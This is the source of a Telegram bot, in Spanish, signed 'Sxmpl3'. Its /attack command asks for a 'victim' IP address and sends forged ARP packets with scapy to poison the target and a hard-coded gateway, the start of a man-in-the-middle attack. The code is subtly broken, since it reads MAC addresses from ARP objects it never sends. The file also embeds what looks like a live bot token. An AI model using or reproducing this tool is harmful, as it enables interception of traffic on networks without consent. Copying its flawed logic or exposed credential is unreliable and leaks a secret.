import logging
import os

from telegram import ReplyKeyboardMarkup
from telegram.ext import CommandHandler, ConversationHandler, MessageHandler, Updater
from scapy.all import ARP, Ether, send

a = 1

ipg = '192.168.75.1'

IP, GATEWAY = range(2)


logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)

logger = logging.getLogger(__name__)

def start(update, context):
    """Comando /start"""

    update.message.reply_text('Hola pringao, usa /help para ver los comandos disponibles')


def help(update, context):
    """Comando /help"""

    update.message.reply_text('Use el comando /attack para realizar el ataque')

def attack(update, context):

    reply_keyboard = [['/cancel']]
    
    ip = update.message.reply_text(
        '¿Cuál es la dirección IP de su víctima? (Escriba "/cancel" para cancelar la petición)',
        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True),
    )

    return IP

def set_ip(update, context):
  
    ip = update.message.text.strip()

    logger.info(f'ARP spoofing iniciado para {ip}')

    target_ip = ip
    gateway_ip = ipg

    try:
        arp = ARP(pdst=target_ip)
        target_mac = arp.hwsrc
        gateway_mac = ARP(pdst=gateway_ip).hwsrc

        packet_target = Ether(dst=target_mac)/ARP(op="is-at", hwsrc=gateway_mac, psrc=gateway_ip, pdst=target_ip)
        packet_gateway = Ether(dst=gateway_mac)/ARP(op="is-at", hwsrc=target_mac, psrc=target_ip, pdst=gateway_ip)

        send(packet_target, verbose=False)
        send(packet_gateway, verbose=False)

        logger.info(f'ARP spoofing finalizado para {ip}')
        update.message.reply_text(f'Se realizó ARP spoofing a la dirección IP {ip}')

    except Exception as e:
        logger.error(f'Ocurrió un error al realizar el ARP spoofing: {str(e)}')
        update.message.reply_text('Ocurrió un error al realizar el ARP spoofing')

    return ConversationHandler.END

def cancel(update, context):

    update.message.reply_text('Operación cancelada')

    return ConversationHandler.END

conv_handler = ConversationHandler(
    entry_points=[CommandHandler('attack', attack)],
  
    states={
        IP: [MessageHandler(None, set_ip)]
    },
  
    fallbacks=[MessageHandler(None, cancel)]
)

def main():
    """Se inicia el bot"""

    updater = Updater("6140799429:AAH3UwOcl4GlqqIy0oRKrTjbEfUAWWCicgU", use_context=True)

    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help))
    dp.add_handler(conv_handler)
    updater.start_polling()

    logger.info("El bot se ha iniciado correctamente")
    updater.idle()

if __name__ == '__main__':
    main()
    
# By Sxmpl3.

